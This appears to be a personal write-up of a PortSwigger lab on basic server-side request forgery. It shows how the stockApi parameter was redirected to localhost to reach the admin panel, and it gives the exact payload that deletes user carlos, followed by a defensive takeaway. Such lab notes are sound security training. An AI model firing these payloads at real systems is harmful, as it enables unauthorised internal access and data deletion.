Lab: Basic SSRF against the local server
Category: SSRF
URL: portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

Goal: Change stock check URL to access internal admin interface and delete user carlos.

Vulnerability: Stock check feature (/product/stock) takes a stockApi parameter and fetches it server-side with no validation — classic SSRF.

Steps:

1. Intercepted POST /product/stock in Burp, found param stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=3
2. Sent to Repeater, replaced value with http://localhost/admin → got rendered admin panel back in response (proved internal access).
3. Found delete link format on admin page: /admin/delete?username=carlos
4. Updated payload: stockApi=http://localhost/admin/delete?username=carlos
5. Sent request → 302 Found, redirect to /admin → user deleted, lab marked solved.

Payload: stockApi=http://localhost/admin/delete?username=carlos
Injection point: stockApi body parameter (POST /product/stock)

Takeaway: Server-side requests trusted "internal" URLs blindly — no allow-list or protocol/host restriction let the app become a proxy into its own internal network.
